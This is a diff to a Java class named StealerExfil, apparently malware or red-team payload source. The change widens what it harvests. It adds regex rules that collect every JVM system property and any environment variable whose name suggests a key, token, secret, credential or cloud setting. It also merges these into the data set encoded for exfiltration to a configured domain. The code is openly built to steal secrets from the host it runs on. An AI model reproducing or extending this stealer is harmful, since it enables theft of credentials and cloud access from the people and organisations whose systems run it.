@@ -5,6 +5,8 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.security.SecureRandom;
 import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     public static final String TOKEN_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.:,;<>|!\"#¤%&/()=+?`'^~'*@()[]{} \n\\";
@@ -14,6 +16,14 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
     static volatile int CONF_DELAY_MS = 0;
+
+    /**
+     * Regular expression of Key to look for while extracting secrets.
+     * This regex is currently used for ENV variables and java system
+     * properties but can be used wider in the future.
+     */
+    static volatile String CONF_STEAL_THIS_PROPERTY_KEY_REGEX = ".*";
+    static volatile String CONF_STEAL_THIS_ENV_KEY_REGEX = ".*(_KEY|_TOKEN|_ID|_SECRET|_CREDENTIALS|_CRED|_PROJECT|CLOUD_|_DOMAIN|_SID).*";
 
     /**
      * Domain to use for data exfiltration.
@@ -88,6 +98,7 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         exfilData.put("os", getOsInfo(javaProps));
         exfilData.put("jvm", getRuntimeInfo(javaProps));
         exfilData.putAll(getJuicyEnvVars(envVars));
+        exfilData.putAll(getJuicyProperties(javaProps));
 
         List<String> requests = encode(exfilData);
 
@@ -104,32 +115,43 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     }
 
     static Map<String, String> getJuicyEnvVars(Map<String, String> env) {
-        final Set<String> interesting = Set.of(
-                "_KEY",
-                "_TOKEN",
-                "_ID",
-                "_SECRET",
-                "_CREDENTIALS",
-                "_CRED",
-                "_PROJECT",
-                "CLOUD_",
-                "_DOMAIN",
-                "_SID"
-        );
+        return getMatcingKeys(env, CONF_STEAL_THIS_ENV_KEY_REGEX);
+    }
 
-        Map<String, String> found = new HashMap<>();
-        for (Map.Entry<String, String> entry : env.entrySet()) {
+    static Map<String, String> getJuicyProperties(Properties props) {
+        return getMatcingKeys(propToMap(props), CONF_STEAL_THIS_PROPERTY_KEY_REGEX);
+    }
+
+    /**
+     * Convert Properties object to Map<String, String> type.
+     * @param prop java.util Properties object.
+     * @return Map of key value pair strings.
+     */
+    static Map<String, String> propToMap(Properties prop) {
+        Map<String, String> map = new HashMap<>();
+        prop.forEach((key, value) -> map.put((String) key, (String) value));
+        return map;
+    }
+
+    /**
+     * Map Key matcher returns whatever is worth stealing in a Map of <String, String>.
+     * @param map Map of Key value pair properties to match
+     * @return      Matching properties as Map of Strings
+     */
+    static Map<String, String> getMatcingKeys(Map<String, String> map, String interesting) {
+        Pattern pattern = Pattern.compile(interesting);
+        Map<String, String> matching = new HashMap<>();
+
+        for (Map.Entry<String, String> entry : map.entrySet()) {
             String key = entry.getKey();
             String value = entry.getValue();
 
-            for (String lookingFor : interesting) {
-                if (key.contains(lookingFor)) {
-                    found.put(key, value);
-                }
+            Matcher matcher = pattern.matcher(key);
+            if (matcher.matches()) {
+                matching.put(key, value);
             }
         }
-
-        return found;
+        return matching;
     }
 
     static String pack(Map<String, String> kv) {
